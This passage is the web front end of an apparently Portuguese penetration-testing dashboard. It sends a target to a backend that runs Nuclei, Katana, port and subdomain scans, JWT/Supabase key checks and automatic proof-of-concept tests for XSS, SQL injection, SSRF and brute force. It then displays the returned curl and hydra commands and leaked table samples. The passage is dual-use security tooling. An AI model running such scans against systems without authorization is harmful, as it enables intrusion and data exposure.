.stat-lbl{font-size:.56rem;color:var(--dm);text-transform:uppercase;letter-spacing:.1em}
.url-list{font-size:.67rem;color:var(--dm);max-height:180px;overflow-y:auto;background:var(--bg3);border:1px solid var(--bd);border-radius:3px;padding:7px}
.url-item{padding:2px 0;border-bottom:1px solid rgba(13,58,92,.2);word-break:break-all}
#lw{background:var(--bg2);border:1px solid var(--bd);border-radius:0 0 5px 5px;height:480px;overflow-y:auto;font-size:.72rem;line-height:1.85}
#li{padding:10px}
.ll{padding:1px 0}
.l-i{color:var(--tx)}.l-ok{color:var(--gn)}.l-warn{color:var(--yl)}.l-crit{color:var(--rd)}.l-high{color:var(--or)}.l-med{color:var(--yl)}.l-section{color:var(--ac);font-weight:bold;margin-top:5px}
table{width:100%;border-collapse:collapse;font-size:.72rem}
th{text-align:left;padding:5px 7px;background:var(--bg3);color:var(--ac);font-size:.58rem;letter-spacing:.1em;text-transform:uppercase;border-bottom:1px solid var(--bd)}
td{padding:5px 7px;border-bottom:1px solid rgba(13,58,92,.25);color:var(--tx);word-break:break-word}
tr:last-child td{border-bottom:none}
.c{color:var(--rd)}.h{color:var(--or)}.m{color:var(--yl)}.ok{color:var(--gn)}
.pg{display:flex;flex-wrap:wrap;gap:4px;margin-top:3px}
.ptg{padding:3px 7px;border-radius:3px;font-size:.67rem;border:1px solid}
.ptg-s{background:rgba(0,255,136,.05);border-color:rgba(0,255,136,.2);color:var(--gn)}
.ptg-d{background:rgba(255,51,85,.07);border-color:rgba(255,51,85,.27);color:var(--rd)}
.em{color:var(--dm);font-size:.68rem;text-align:center;padding:11px;font-style:italic}
.uab{display:flex;align-items:center;gap:5px;margin-bottom:5px}
.uap{flex:1;background:var(--bg3);border:1px solid var(--bd);border-radius:2px;height:6px;overflow:hidden}
.uaf{height:100%;border-radius:2px;transition:width .5s}
.lhdr{display:flex;align-items:center;gap:6px;padding:8px 12px;background:var(--bg2);border:1px solid var(--bd);border-bottom:none;border-radius:5px 5px 0 0}
.lht{font-family:'Rajdhani',sans-serif;font-size:.76rem;font-weight:600;color:var(--ac);text-transform:uppercase;letter-spacing:.07em}
.clr{margin-left:auto;background:none;border:1px solid var(--bd);color:var(--dm);padding:2px 6px;border-radius:2px;cursor:pointer;font-family:inherit;font-size:.58rem}
::-webkit-scrollbar{width:3px}::-webkit-scrollbar-track{background:var(--bg)}::-webkit-scrollbar-thumb{background:var(--dm);border-radius:2px}
</style></head><body>
<div class="wrap">
<header>
  <div class="logo">&#9670; SOC SCANNER <span style="font-size:1.4rem;color:var(--rd)">PRO</span></div>
  <div class="sub">Advanced Pentest &middot; Nuclei &middot; Katana &middot; CVE &middot; PoC Real &middot; OWASP Top 10</div>
</header>
<div style="text-align:center;margin-bottom:8px">
  <span class="pill wait" id="cpill"><span class="dot pulse"></span><span id="ctxt">A conectar...</span></span>
</div>
<div class="ibox">
  <label>&#9658; Alvo</label>
  <div class="irow">
    <input id="ti" type="text" placeholder="https://exemplo.com  |  dominio.pt  |  192.168.1.1" autocomplete="off">
    <button id="btn-scan">&#9001; SCAN COMPLETO + PoC</button>
  </div>
</div>
<div class="sbar" id="sbar">
  <span class="spin">&#9881;</span>
  <span class="stx" id="stx">A iniciar...</span>
  <div class="strack"><div class="sfill" id="sfill"></div></div>
  <span class="spct" id="spct">0%</span>
</div>
<div class="tabs">
  <div class="tab s" id="tab-s" onclick="showTab('s')">&#128202; Resultados</div>
  <div class="tab" id="tab-p" onclick="showTab('p')">&#129514; Provas de Conceito</div>
  <div class="tab" id="tab-n" onclick="showTab('n')">&#128027; Nuclei CVEs</div>
  <div class="tab" id="tab-k" onclick="showTab('k')">&#128375; Katana</div>
  <div class="tab" id="tab-b" onclick="showTab('b')">&#127758; Subdominios</div>
  <div class="tab" id="tab-j" onclick="showTab('j')">&#128272; JWT / Supabase</div>
</div>
<div id="tc-s" class="tc on">
  <div class="grid">
    <div>
      <div class="sc" id="sc">
        <div class="ring">
          <svg width="90" height="90" viewBox="0 0 90 90">
            <circle cx="45" cy="45" r="38" fill="none" stroke="#071520" stroke-width="7"/>
            <circle cx="45" cy="45" r="38" fill="none" id="arc" stroke="#00ff88" stroke-width="7" stroke-linecap="round" stroke-dasharray="239" stroke-dashoffset="239"/>
          </svg>
          <div class="rn"><div class="n" id="sn">--</div><div class="l">/ 100</div></div>
        </div>
        <div class="gv" id="gv">-</div><div class="gd" id="gd"></div>
      </div>
      <div id="panels"></div>
    </div>
    <div>
      <div class="lhdr"><span>&#9632;</span><span class="lht">Terminal ao Vivo</span><button class="clr" id="clr-btn">limpar</button></div>
      <div id="lw"><div id="li"><div class="ll l-section">SOC Scanner PRO v5.0 — pronto.</div></div></div>
    </div>
  </div>
</div>
<div id="tc-p" class="tc">
  <div class="disc"><strong>AVISO LEGAL:</strong> Usar apenas em sistemas proprios ou com autorizacao explicita. Uso nao autorizado e ilegal.</div>
  <div id="poc-area"><div class="em">Corre o scan. Os PoCs sao executados automaticamente no final.</div></div>
</div>
<div id="tc-n" class="tc"><div id="nuclei-area"><div class="em">Corre o scan para ver CVEs do Nuclei.</div></div></div>
<div id="tc-k" class="tc"><div id="katana-area"><div class="em">Corre o scan para ver URLs do Katana.</div></div></div>
<div id="tc-b" class="tc"><div id="sub-area"><div class="em">Corre o scan para ver subdominios.</div></div></div>
<div id="tc-j" class="tc"><div id="jwt-area"><div class="em">Corre o scan para ver JWT e credenciais Supabase.</div></div></div>
</div>
<script>
(function(){
var socket=io({transports:['polling','websocket'],reconnection:true,reconnectionDelay:1000});
var scanning=false,connected=false;
socket.on('connect',function(){
  connected=true;
  var p=document.getElementById('cpill');
  p.className='pill ok';
  p.innerHTML='<span class="dot"></span><span>Ligado — pronto!</span>';
  addLog('Servidor ligado. Podes iniciar o scan!','ok');
});
socket.on('disconnect',function(){
  connected=false;
  var p=document.getElementById('cpill');
  p.className='pill err';
  p.innerHTML='<span class="dot"></span><span>Desconectado...</span>';
});
socket.on('log',function(d){ if(d&&d.msg) addLog(d.msg,d.level); });
socket.on('progress',function(d){
  if(!d) return;
  var pct=d.pct||Math.round(d.step/d.total*100);
  document.getElementById('sbar').className='sbar on';
  document.getElementById('stx').textContent=d.name+'... ['+d.step+'/'+d.total+']';
  document.getElementById('sfill').style.width=pct+'%';
  document.getElementById('spct').textContent=pct+'%';
});
socket.on('scan_done',function(d){
  scanning=false;
  document.getElementById('btn-scan').disabled=false;
  document.getElementById('sfill').style.width='100%';
  setTimeout(function(){document.getElementById('sbar').className='sbar';},700);
  if(d){
    renderScore(d.score,d.grade);
    renderPanels(d.results);
    renderPoC(d.results.poc);
    renderNuclei(d.results.nuclei);
    renderKatana(d.results.katana);
    renderSubs(d.results.subdomains);
    renderJwtSupabase(d.results.jwt_supabase);
  }
  addLog('SCAN COMPLETO! Score: '+(d?d.score:'-')+'/100','ok');
});
socket.on('scan_error',function(d){
  scanning=false;
  document.getElementById('btn-scan').disabled=false;
  document.getElementById('sbar').className='sbar';
  addLog('ERRO: '+(d?d.error:'?'),'crit');
});
function showTab(t){
  ['s','p','n','k','b','j'].forEach(function(x){
    document.getElementById('tab-'+x).className='tab'+(t===x?' '+x:'');
    document.getElementById('tc-'+x).className='tc'+(t===x?' on':'');
  });
}
window.showTab=showTab;
function tog(id){document.getElementById(id).classList.toggle('on');}
window.tog=tog;
function addLog(msg,lvl){
  var m={info:'i',ok:'ok',warn:'warn',crit:'crit',high:'high',med:'med',low:'low',section:'section'};
  var d=document.createElement('div');
  d.className='ll l-'+(m[lvl]||'i');
  d.textContent=msg;
  var li=document.getElementById('li');
  li.appendChild(d);
  document.getElementById('lw').scrollTop=99999;
}
document.getElementById('btn-scan').addEventListener('click',function(){
  var t=document.getElementById('ti').value.trim();
  if(!t){addLog('Insere um alvo!','warn');return;}
  if(scanning){addLog('Scan em curso...','warn');return;}
  if(!connected){addLog('Servidor nao ligado!','crit');return;}
  scanning=true;
  document.getElementById('btn-scan').disabled=true;
  document.getElementById('panels').innerHTML='';
  document.getElementById('sc').style.display='none';
  document.getElementById('poc-area').innerHTML='<div class="em">PoCs a executar...</div>';
  document.getElementById('nuclei-area').innerHTML='<div class="em">Nuclei a correr...</div>';
  document.getElementById('katana-area').innerHTML='<div class="em">Katana a correr...</div>';
  document.getElementById('sub-area').innerHTML='<div class="em">A descobrir subdominios...</div>';
  document.getElementById('jwt-area').innerHTML='<div class="em">JWT/Supabase a analisar...</div>';
  document.getElementById('li').innerHTML='';
  document.getElementById('sbar').className='sbar on';
  addLog('A iniciar scan COMPLETO + PoC: '+t,'section');
  socket.emit('start_scan',{target:t});
});
document.getElementById('clr-btn').addEventListener('click',function(){document.getElementById('li').innerHTML='';});
document.getElementById('ti').addEventListener('keydown',function(e){if(e.key==='Enter')document.getElementById('btn-scan').click();});
function esc(s){return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');}
function tc(s){return{crit:'c',high:'h',med:'m',ok:'ok',low:'lo'}[s]||'ok';}
function mkP(ic,ti,body,ct){
  var id='p'+Math.random().toString(36).slice(2,7);
  return '<div class="pan"><div class="ph" onclick="tog(\''+id+'\')"><span>'+ic+'</span><span class="pt">'+ti+'</span>'+(ct?'<span class="pct2">'+esc(ct)+'</span>':'')+'</div><div class="pb on" id="'+id+'">'+body+'</div></div>';
}
function renderScore(s,g){
  document.getElementById('sc').style.display='block';
  document.getElementById('sn').textContent=s;
  var C={A:'#00ff88',B:'#88ff00',C:'#ffcc00',D:'#ff8800',F:'#ff3355'};
  var D={A:'Excelente',B:'Bom',C:'Razoavel',D:'Fraco',F:'CRITICO!'};
  document.getElementById('gv').textContent=g;
  document.getElementById('gv').style.color=C[g]||'#fff';
  document.getElementById('gd').textContent=D[g]||'';
  var arc=document.getElementById('arc');
  arc.style.stroke=C[g]||'#00ff88';
  arc.style.transition='stroke-dashoffset 1.2s ease';
  setTimeout(function(){arc.style.strokeDashoffset=239-(239*s/100);},100);
}
function renderPoC(poc){
  if(!poc){document.getElementById('poc-area').innerHTML='<div class="em">Sem dados PoC</div>';return;}
  var keys=Object.keys(poc);
  var vc=keys.filter(function(k){return poc[k].success;}).length;
  var POCM={
    clickjacking:{ic:'&#128432;',ti:'Clickjacking'},
    cors:{ic:'&#127760;',ti:'CORS Arbitrario'},
    open_redirect:{ic:'&#8599;&#65039;',ti:'Open Redirect'},
    xss_reflected:{ic:'&#128137;',ti:'XSS Reflectido'},
    sql_injection:{ic:'&#128200;',ti:'SQL Injection'},
    http_methods:{ic:'&#9889;',ti:'HTTP Methods'},
    info_leakage:{ic:'&#128373;&#65039;',ti:'Info Leakage'},
    sensitive_files:{ic:'&#128196;',ti:'Ficheiros Sensiveis'},
    tls_downgrade:{ic:'&#128275;',ti:'TLS Downgrade'},
    rate_limit:{ic:'&#128273;',ti:'Rate Limit / Brute-Force'},
    dns_zone_transfer:{ic:'&#128270;',ti:'DNS Zone Transfer'},
    ssrf:{ic:'&#127760;',ti:'SSRF'},
    subdomain_takeover:{ic:'&#127988;',ti:'Subdomain Takeover'}
  };
  var html='<div class="poc-sum"><div class="big" style="color:'+(vc>0?'var(--rd)':'var(--gn)')+'">'+vc+'/'+keys.length+'</div>'+
    '<div><div style="font-family:Rajdhani,sans-serif;font-size:1.1rem;font-weight:700;color:'+(vc>0?'var(--rd)':'var(--gn)')+'">'+
    (vc>0?'Vulnerabilidades Confirmadas!':'Sem exploraveis confirmados')+'</div>'+
    '<div style="font-size:.63rem;color:var(--dm)">'+keys.length+' PoCs executados com resultados reais</div></div></div>';
  keys.forEach(function(key){
    var result=poc[key]; var meta=POCM[key]||{ic:'&#128300;',ti:key};
    var isV=result.success; var id='poc_'+key;
    html+='<div class="poc-panel"><div class="poc-ph" onclick="tog(\''+id+'\')">'+
      '<span style="font-size:.9rem">'+meta.ic+'</span>'+
      '<span class="poc-tit '+(isV?'poc-v':'poc-s')+'">'+meta.ti+'</span>'+
      '<span class="poc-bdg '+(isV?'bdg-v':'bdg-s')+'">'+(isV?'VULNERAVEL':'SEGURO')+'</span>'+
      '</div><div class="poc-body on" id="'+id+'">'+
      '<div class="poc-out">'+esc(result.output)+'</div>';
    if(isV&&result.proofs){
      result.proofs.forEach(function(proof){
        if(proof.impact) html+='<div class="poc-imp">&#9888;&#65039; '+esc(proof.impact)+'</div>';
        var cmds=['curl_poc','openssl_poc','hydra_poc','dig_poc'];
        cmds.forEach(function(cmd){
          if(proof[cmd]) html+='<div class="poc-cmd"><div class="poc-cmd-l">'+cmd.replace('_poc','').toUpperCase()+' — Comando Real</div><code>'+esc(proof[cmd])+'</code></div>';
        });
        if(proof.js_poc) html+='<div class="poc-js"><div class="poc-js-l">JavaScript / PoC Code</div><code>'+esc(proof.js_poc)+'</code></div>';
        if(proof.poc_url) html+='<div style="margin:4px 0;font-size:.69rem"><span style="color:var(--dm)">URL de Teste: </span><a href="'+esc(proof.poc_url)+'" target="_blank" style="color:var(--ac)">'+esc(proof.poc_url)+'</a></div>';
        if(proof.content_preview) html+='<div class="poc-out" style="border-color:rgba(255,51,85,.3);max-height:120px"><span style="color:var(--or);font-size:.6rem">CONTEUDO REAL (CENSURADO):\n</span>'+esc(proof.content_preview)+'</div>';
        if(proof.response_preview) html+='<div class="poc-out" style="border-color:rgba(255,136,0,.3);max-height:100px"><span style="color:var(--yl);font-size:.6rem">RESPOSTA DO SERVIDOR:\n</span>'+esc(proof.response_preview)+'</div>';
        if(proof.sample_records&&proof.sample_records.length) html+='<div class="poc-out" style="max-height:100px"><span style="color:var(--ac);font-size:.6rem">REGISTOS DNS EXPOSTOS:\n</span>'+proof.sample_records.map(function(r){return esc(r);}).join('\n')+'</div>';
      });
    }
    html+='</div></div>';
  });
  document.getElementById('poc-area').innerHTML=html;
}
function renderNuclei(nuc){
  if(!nuc){document.getElementById('nuclei-area').innerHTML='<div class="em">Sem dados Nuclei</div>';return;}
  var findings=nuc.findings||[];
  var crit=findings.filter(function(f){return f.severity==='critical';});
  var high=findings.filter(function(f){return f.severity==='high';});
  var med=findings.filter(function(f){return f.severity==='medium';});
  var html='<div class="stat-grid">'+
    '<div class="stat-box"><div class="stat-num" style="color:#ff4444">'+crit.length+'</div><div class="stat-lbl">Criticos</div></div>'+
    '<div class="stat-box"><div class="stat-num" style="color:var(--or)">'+high.length+'</div><div class="stat-lbl">Altos</div></div>'+
    '<div class="stat-box"><div class="stat-num" style="color:var(--yl)">'+med.length+'</div><div class="stat-lbl">Medios</div></div>'+
    '<div class="stat-box"><div class="stat-num" style="color:var(--ac)">'+findings.length+'</div><div class="stat-lbl">Total</div></div>'+
    '</div>';
  if(!findings.length){html+='<div class="em">Sem vulnerabilidades encontradas pelo Nuclei.</div>';}
  else{
    findings.sort(function(a,b){var o={critical:0,high:1,medium:2,low:3,info:4};return(o[a.severity]||5)-(o[b.severity]||5);});
    findings.forEach(function(f){
      html+='<div class="nuc-item"><span class="sev sev-'+(f.severity||'info')+'">'+esc(f.severity||'info')+'</span>'+
        '<strong>'+esc(f.name)+'</strong>'+
        (f.cve&&f.cve.length?f.cve.map(function(c){return'<span class="cve-tag">'+esc(c)+'</span>';}).join(''):'')+
        '<div style="font-size:.67rem;color:var(--dm);margin-top:3px">'+esc(f.matched)+'</div>'+
        (f.description?'<div style="font-size:.67rem;color:var(--tx);margin-top:2px">'+esc(f.description)+'</div>':'')+
        '</div>';
    });
  }
  document.getElementById('nuclei-area').innerHTML=html;
}
function renderKatana(k){
  if(!k){document.getElementById('katana-area').innerHTML='<div class="em">Sem dados</div>';return;}
  var html='<div class="stat-grid" style="grid-template-columns:repeat(3,1fr)">'+
    '<div class="stat-box"><div class="stat-num" style="color:var(--gn)">'+k.urls_found+'</div><div class="stat-lbl">URLs</div></div>'+
    '<div class="stat-box"><div class="stat-num" style="color:var(--or)">'+(k.interesting_params||[]).length+'</div><div class="stat-lbl">Params</div></div>'+
    '<div class="stat-box"><div class="stat-num" style="color:var(--ac)">'+(k.urls||[]).length+'</div><div class="stat-lbl">Armazenadas</div></div>'+
    '</div>';
  if(k.interesting_params&&k.interesting_params.length){
    html+=mkP('&#9888;&#65039;','Parametros Interessantes (alvos para SQLi/XSS)','<table><tr><th>URL</th><th>Parametro</th></tr>'+k.interesting_params.map(function(p){return'<tr><td style="font-size:.65rem">'+esc(p.url.substring(0,60))+'</td><td class="h">'+esc(p.param)+'</td></tr>';}).join('')+'</table>',k.interesting_params.length+'');
  }
  if(k.urls&&k.urls.length){
    html+=mkP('&#127760;','URLs Descobertas','<div class="url-list">'+k.urls.map(function(u){return'<div class="url-item">'+esc(u)+'</div>';}).join('')+'</div>',k.urls.length+'');
  }
  document.getElementById('katana-area').innerHTML=html;
}
function renderSubs(s){
  if(!s){document.getElementById('sub-area').innerHTML='<div class="em">Sem dados</div>';return;}
  var html='<div class="stat-grid" style="grid-template-columns:repeat(2,1fr)">'+
    '<div class="stat-box"><div class="stat-num" style="color:var(--pu)">'+s.found+'</div><div class="stat-lbl">Encontrados</div></div>'+
    '<div class="stat-box"><div class="stat-num" style="color:var(--gn)">'+(s.live||[]).length+'</div><div class="stat-lbl">Online</div></div>'+
    '</div>';
  if(s.live&&s.live.length){
    html+='<table><tr><th>Subdominio</th><th>HTTP</th><th>Titulo</th></tr>'+s.live.map(function(sub){return'<tr><td class="ok">'+esc(sub.subdomain)+'</td><td>'+sub.status+'</td><td style="font-size:.67rem">'+esc(sub.title)+'</td></tr>';}).join('')+'</table>';
  } else { html+='<div class="em">Nenhum subdominio vivo encontrado.</div>'; }
  document.getElementById('sub-area').innerHTML=html;
}
function renderPanels(r){
  var html='';
  if(r.headers){
    var ms=r.headers.missing||[],pr=r.headers.present||[],lk=r.headers.leaked||[];
    var b='';
    if(ms.length){b+='<table><tr><th>Header Ausente</th><th>Risco</th></tr>'+ms.map(function(h){return'<tr><td class="c">'+esc(h.header)+'</td><td class="h">'+esc(h.risk)+'</td></tr>';}).join('')+'</table>';}
    if(lk.length){b+='<br><table><tr><th>Vazado</th><th>Valor</th></tr>'+lk.map(function(h){return'<tr><td class="h">'+esc(h.header)+'</td><td>'+esc(h.value)+'</td></tr>';}).join('')+'</table>';}
    if(pr.length){b+='<br><table><tr><th>Presente</th><th>Valor</th></tr>'+pr.map(function(h){return'<tr><td class="ok">'+esc(h.header)+'</td><td style="font-size:.68rem">'+esc(h.value.substring(0,70))+'</td></tr>';}).join('')+'</table>';}
    html+=mkP('&#128737;','Security Headers',b||'<div class="em">Sem dados</div>',ms.length+' ausentes');
  }
  if(r.tls){
    var t=r.tls;
    var b=t.error?'<div class="c">Erro: '+esc(t.error)+'</div>':'<table><tr><th>Campo</th><th>Valor</th><th>OK</th></tr><tr><td>Protocolo</td><td>'+esc(t.protocol||'N/A')+'</td><td class="'+((['TLSv1.2','TLSv1.3'].indexOf(t.protocol)>=0)?'ok':'c')+'">'+(['TLSv1.2','TLSv1.3'].indexOf(t.protocol)>=0?'OK':'FRACO')+'</td></tr><tr><td>Cert.</td><td>'+(t.cert_days_left!=null?t.cert_days_left+' dias':'N/A')+'</td><td class="'+(t.cert_days_left!=null&&t.cert_days_left<30?'c':'ok')+'">'+(t.cert_days_left!=null&&t.cert_days_left<30?'URGENTE':'OK')+'</td></tr></table>';
    html+=mkP('&#128272;','TLS/SSL',b);
  }
  if(r.ports){
    var dn=[21,23,3306,5432,6379,27017,3389,5900,445,9200,11211];
    var nm={21:'FTP',22:'SSH',23:'Telnet',25:'SMTP',53:'DNS',80:'HTTP',443:'HTTPS',445:'SMB',3306:'MySQL',3389:'RDP',5432:'PgSQL',5900:'VNC',6379:'Redis',8080:'Alt',9200:'Elastic',27017:'MongoDB'};
    var b='<div class="pg">';
    if(r.ports.open.length) r.ports.open.forEach(function(p){b+='<div class="ptg '+(dn.indexOf(p)>=0?'ptg-d':'ptg-s')+'">'+p+'<br><small>'+(nm[p]||'?')+'</small></div>';});
    else b+='<div class="em">Sem portas perigosas</div>';
    b+='</div>';
    html+=mkP('&#127760;','Portas',b,r.ports.open.length+' abertas');
  }
  if(r.paths){
    var b=r.paths.length?'<table><tr><th>Path</th><th>HTTP</th><th>Risco</th></tr>'+r.paths.map(function(p){return'<tr><td>'+esc(p.path)+'</td><td class="'+(p.status===200?'c':'m')+'">'+p.status+'</td><td class="'+tc(p.severity)+'">'+p.severity.toUpperCase()+'</td></tr>';}).join('')+'</table>':'<div class="em">Sem paths expostos</div>';
    html+=mkP('&#128193;','Paths Sensiveis',b,r.paths.length+'');
  }
  if(r.ua_blocking){
    var nb=r.ua_blocking.not_blocked||[],bl=r.ua_blocking.blocked||[],tot=r.ua_blocking.total||1;
    var pct=Math.round(bl.length/tot*100);
    var fc=pct===100?'var(--gn)':pct>50?'var(--yl)':'var(--rd)';
    var b='<div class="uab"><div class="uap"><div class="uaf" style="width:'+pct+'%;background:'+fc+'"></div></div><span style="font-size:.62rem;color:'+fc+'">'+pct+'%</span></div>';
    b+='<table><tr><th>Scanner</th><th>HTTP</th><th>Estado</th></tr>';
    nb.forEach(function(u){b+='<tr><td class="c">'+u.name+'</td><td>'+u.code+'</td><td class="c">NAO BLOQ.</td></tr>';});
    bl.forEach(function(u){b+='<tr><td class="ok">'+u.name+'</td><td>'+(u.code||'recusado')+'</td><td class="ok">BLOQ.</td></tr>';});
    b+='</table>';
    html+=mkP('&#129302;','Bloqueio Scanners',b,nb.length?nb.length+' expostos':'100% OK');
  }
  if(r.rate_limit&&Object.keys(r.rate_limit).length){
    var b='<table><tr><th>Endpoint</th><th>Rate Limit</th><th>Pedidos</th></tr>';
    Object.keys(r.rate_limit).forEach(function(l){var v=r.rate_limit[l];b+='<tr><td>'+l+'</td><td class="'+(v.limited?'ok':'c')+'">'+(v.limited?'OK':'AUSENTE')+'</td><td>'+v.codes.length+'</td></tr>';});
    b+='</table>';
    html+=mkP('&#9201;','Rate Limiting',b);
  }
  if(r.dns){
    var d=r.dns;
    var b='<table><tr><th>Tipo</th><th>Registos</th></tr>';
    ['A','AAAA','MX','NS'].forEach(function(t){if(d[t]&&d[t].length)b+='<tr><td>'+t+'</td><td style="font-size:.68rem">'+d[t].slice(0,2).join('<br>')+'</td></tr>';});
    b+='<tr><td>DNSSEC</td><td class="'+(d.dnssec?'ok':'m')+'">'+(d.dnssec?'OK':'Inactivo')+'</td></tr><tr><td>SPF</td><td class="'+(d.SPF?'ok':'h')+'">'+(d.SPF?'OK':'AUSENTE')+'</td></tr><tr><td>DMARC</td><td class="'+(d.DMARC?'ok':'h')+'">'+(d.DMARC?'OK':'AUSENTE')+'</td></tr></table>';
    if(d.whois&&!d.whois.error)b+='<br><table><tr><th colspan="2">WHOIS</th></tr><tr><td>Registrar</td><td>'+esc(d.whois.registrar)+'</td></tr><tr><td>Expiracao</td><td>'+esc(d.whois.expiration_date)+'</td></tr></table>';
    html+=mkP('&#128270;','DNS/WHOIS',b);
  }
  if(r.cors){
    var b='<table><tr><th>Origem</th><th>Allow-Origin</th><th>Estado</th></tr>';
    Object.keys(r.cors).forEach(function(o){var v=r.cors[o];b+='<tr><td style="font-size:.68rem">'+esc(o)+'</td><td class="'+(v.acao==='*'?'c':v.acao===o?'h':'ok')+'">'+esc(v.acao||'-')+'</td><td class="'+((v.acao==='*'||v.acao===o)?'c':'ok')+'">'+((v.acao==='*'||v.acao===o)?'RISCO':'OK')+'</td></tr>';});
    b+='</table>';
    html+=mkP('&#128279;','CORS',b);
  }
  if(r.injection){
    var waf=r.injection.waf_detected;
    var b='<div style="padding:5px;border-radius:3px;margin-bottom:6px;background:'+(waf?'rgba(0,255,136,.05)':'rgba(255,136,0,.05)')+';color:'+(waf?'var(--gn)':'var(--or)')+'">WAF: '+(waf?esc(r.injection.waf_product):'SEM WAF!')+'</div>';
    b+='<table><tr><th>Payload</th><th>HTTP</th><th>Bloq.</th></tr>';
    Object.keys(r.injection).forEach(function(k){var v=r.injection[k];if(typeof v==='object'&&v&&v.status)b+='<tr><td>'+esc(k)+'</td><td>'+v.status+'</td><td class="'+(v.blocked?'ok':'h')+'">'+(v.blocked?'S':'N')+'</td></tr>';});
    b+='</table>';
    html+=mkP('&#129514;','WAF/Injeccao',b,waf?'WAF OK':'Sem WAF');
  }
  if(r.fingerprint){
    var f=r.fingerprint;
    var b='<table><tr><th>Check</th><th>Estado</th></tr><tr><td>.git</td><td class="'+(f.git_exposed?'c':'ok')+'">'+(f.git_exposed?'EXPOSTO!':'OK')+'</td></tr><tr><td>.env</td><td class="'+(f.env_exposed?'c':'ok')+'">'+(f.env_exposed?'EXPOSTO!':'OK')+'</td></tr><tr><td>Clickjacking</td><td class="'+(f.clickjacking?'h':'ok')+'">'+(f.clickjacking?'Possivel':'OK')+'</td></tr><tr><td>robots.txt</td><td class="'+(f.robots_txt?'ok':'m')+'">'+(f.robots_txt?'OK':'Ausente')+'</td></tr></table>';
    if(f.tech_leaked&&f.tech_leaked.length)b+='<div class="h" style="margin-top:5px">Stack: '+f.tech_leaked.join(', ')+'</div>';
    html+=mkP('&#128373;&#65039;','Fingerprinting',b);
  }
  if(r.methods){
    var m=r.methods.dangerous_allowed||[];
    var b=m.length?'<table><tr><th>Metodo</th><th>Risco</th></tr>'+m.map(function(x){return'<tr><td class="c">'+x.method+'</td><td>'+esc(x.risk)+'</td></tr>';}).join('')+'</table>':'<div class="ok" style="padding:7px">Sem metodos perigosos</div>';
    html+=mkP('&#9889;','Metodos HTTP',b);
  }
  document.getElementById('panels').innerHTML=html||'<div class="em">Sem dados</div>';
}
function renderJwtSupabase(d){
  if(!d){document.getElementById('jwt-area').innerHTML='<div class="em">Sem dados</div>';return;}
  var jt=d.jwt_tokens||[],su=d.supabase_urls||[],sk=d.supabase_keys||[];
  var sp=d.supabase_probes||[],vl=d.vulnerabilities||[],sm=d.sourcemaps||[],jw=d.jwks||[];
  var html='<div class="stat-grid" style="grid-template-columns:repeat(4,1fr)">'+
    '<div class="stat-box"><div class="stat-num" style="color:'+(jt.length?'var(--rd)':'var(--gn)')+'">'+jt.length+'</div><div class="stat-lbl">JWTs</div></div>'+
    '<div class="stat-box"><div class="stat-num" style="color:'+(sk.length?'var(--rd)':'var(--gn)')+'">'+sk.length+'</div><div class="stat-lbl">Supabase Keys</div></div>'+
    '<div class="stat-box"><div class="stat-num" style="color:'+(sp.length?'var(--rd)':'var(--gn)')+'">'+sp.length+'</div><div class="stat-lbl">Tabelas Exp.</div></div>'+
    '<div class="stat-box"><div class="stat-num" style="color:'+(vl.length?'var(--rd)':'var(--gn)')+'">'+vl.length+'</div><div class="stat-lbl">Vulns JWT</div></div>'+
    '</div>';
  if(su.length){html+=mkP('&#127760;','Supabase URLs Encontradas','<table><tr><th>URL</th></tr>'+su.map(function(u){return'<tr><td class="c">'+esc(u)+'</td></tr>';}).join('')+'</table>',su.length+'');}
  if(sk.length){
    html+=mkP('&#128273;','Supabase Keys Expostas','<table><tr><th>Key (truncada)</th><th>Role</th><th>Iss</th></tr>'+sk.map(function(k){
      var pl={};try{var p=k.split('.')[1];var pad=p.replace(/-/g,'+').replace(/_/g,'/');pad+='===='.slice(pad.length%4||4);pl=JSON.parse(atob(pad));}catch(e){}
      return'<tr><td class="c" style="font-size:.64rem">'+esc(k.substring(0,55))+'...</td><td class="h">'+esc(pl.role||'N/A')+'</td><td style="font-size:.63rem">'+esc(pl.iss||'N/A')+'</td></tr>';
    }).join('')+'</table>',sk.length+'');
  }
  if(sp.length){
    var b='';sp.forEach(function(p){
      b+='<div style="margin-bottom:8px;border:1px solid rgba(255,51,85,.3);border-radius:3px;padding:8px">'+
        '<div class="c" style="font-family:Rajdhani,sans-serif;font-weight:700">'+esc(p.table)+' — '+p.rows+' row(s)</div>'+
        '<div class="poc-imp">'+esc(p.impact)+'</div>'+
        '<div class="poc-out" style="max-height:100px">'+esc(p.sample||'')+'</div></div>';
    });
    html+=mkP('&#128200;','Supabase Tables Expostas',b,sp.length+'');
  }
  if(jt.length){
    var b='<table><tr><th>Token (trunc.)</th><th>role</th><th>iss</th><th>exp</th><th>Fonte</th></tr>'+
      jt.map(function(t){return'<tr><td class="c" style="font-size:.6rem">'+esc(String(t.token||'').substring(0,35))+'...</td>'+
        '<td class="h">'+esc(String(t.role||'N/A'))+'</td><td style="font-size:.62rem">'+esc(String(t.iss||'N/A'))+'</td>'+
        '<td style="font-size:.62rem">'+esc(String(t.exp||'N/A'))+'</td><td style="font-size:.62rem">'+esc(String(t.source||''))+'</td></tr>';
      }).join('')+'</table>';
    html+=mkP('&#128274;','JWT Tokens Encontrados',b,jt.length+'');
  }
  if(vl.length){
    var b='';vl.forEach(function(v){
      b+='<div style="margin-bottom:8px;border:1px solid rgba(255,51,85,.4);border-radius:3px;padding:8px">'+
        '<div class="c" style="font-family:Rajdhani,sans-serif;font-weight:700">[CRITICAL] '+esc(v.type)+'</div>'+
        '<div class="poc-imp">'+esc(v.impact)+'</div>'+
        '<div class="poc-cmd"><div class="poc-cmd-l">CURL PoC</div><code>'+esc(v.curl_poc||'')+'</code></div></div>';
    });
    html+=mkP('&#9889;','Vulnerabilidades JWT',b,vl.length+'');
  }
  if(sm.length){html+=mkP('&#128196;','Source Maps Expostos','<table><tr><th>Path</th><th>Tamanho</th><th>Nota</th></tr>'+sm.map(function(s){return'<tr><td class="h">'+esc(s.path)+'</td><td>'+s.size+'B</td><td style="font-size:.67rem">'+esc(s.note)+'</td></tr>';}).join('')+'</table>',sm.length+'');}
  if(jw.length){html+=mkP('&#128275;','JWKS Endpoints','<table><tr><th>Path</th><th>Preview</th></tr>'+jw.map(function(j){return'<tr><td class="h">'+esc(j.path)+'</td><td style="font-size:.63rem">'+esc(String(j.data||'').substring(0,100))+'</td></tr>';}).join('')+'</table>',jw.length+'');}
